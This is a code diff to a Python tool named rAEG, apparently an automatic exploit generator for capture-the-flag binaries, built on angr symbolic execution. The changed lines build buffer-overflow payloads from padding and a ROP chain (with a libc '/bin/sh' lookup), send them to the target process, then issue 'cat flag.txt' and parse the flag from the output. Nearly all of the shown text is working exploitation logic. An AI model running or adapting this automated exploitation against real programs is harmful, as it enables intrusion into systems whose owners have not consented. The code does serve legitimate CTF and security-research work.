@@ -213,7 +213,7 @@ class rAEG:
                 stdin=self.symbolic_input,
                 add_options = angr.options.unicorn
         )
-        self.simgr = self.proj.factory.simgr(self.state)#, save_unconstrained=True)
+        self.simgr = self.proj.factory.simgr(self.state, save_unconstrained=True)
         self.simgr.stashes["mem_corrupt"] = []
         self.simgr.stashes["format_strings"] = []
 
@@ -306,7 +306,6 @@ class rAEG:
                     else:
                         padding += 8
                 self.padding = padding
-                print(self.padding)
 
 
     def find_goal(self, function_name):
@@ -565,10 +564,6 @@ class rAEG:
         #logger.info(f"Found /bin/sh address in libc {hex(u64(bin_sh))}")
 
 
-        #padding_len = 152
-        #padding_len = 88
-        #padding_len = 216
-
         # If there is no symbolic padding then using core dump
         if self.symbolic_padding == None:
             chain = b"A" * self.padding
@@ -592,7 +587,7 @@ class rAEG:
         p.sendline(chain)
         p.sendline(b"cat flag.txt")
         try:
-            output = p.recvall(timeout=40)
+            output = p.recvall(timeout=2)
             print(output)
             if b"flag" in output:
                 self.flag = b"flag{" + output.split(b"{")[1].replace(b" ", b"").replace(b"\n", b"").split(b"}")[0] + b"}"
@@ -846,27 +841,25 @@ class rAEG:
 
         if self.rop_chain != None:
             if self.symbolic_padding != None:
-                logger.info("Sending ROP Chain")
-                p.sendline(self.symbolic_padding + self.rop_chain)
-                p.sendline(b"cat flag.txt")
-                p.sendline(b"cat flag.txt")
-                try:
-                    output = p.recvall(timeout=1).decode()
-                    self.flag = "flag{" + output.split("{")[1].split("}")[0] + "}"
-                    print(self.flag)
-                except:
-                    logger.info("ROP chain exploit failed")
+                if len(self.symbolic_padding) == self.padding:
+                    logger.info("Sending ROP Chain with symbolic padding")
+                    p.sendline(self.symbolic_padding + self.rop_chain)
+                else:
+                    logger.info(f"Sending ROP Chain with {self.padding} padding")
+                    p.sendline(b"A" * self.padding + self.rop_chain)
             else:
-                logger.info("Sending ROP Chain")
+                logger.info(f"Sending ROP Chain with {self.padding} padding")
                 p.sendline(b"A" * self.padding + self.rop_chain)
-                p.sendline(b"cat flag.txt")
-                p.sendline(b"cat flag.txt")
-                try:
-                    output = p.recvall(timeout=1).decode()
-                    self.flag = "flag{" + output.split("{")[1].split("}")[0] + "}"
-                    print(self.flag)
-                except:
-                    logger.info("ROP chain exploit failed")
+
+
+            p.sendline(b"cat flag.txt")
+            p.sendline(b"cat flag.txt")
+            try:
+                output = p.recvall(timeout=2).decode()
+                self.flag = "flag{" + output.split("{")[1].split("}")[0] + "}"
+                print(self.flag)
+            except:
+                logger.info("ROP chain exploit failed")
 
 
         # Assume that its a format challenge either format write or format leak
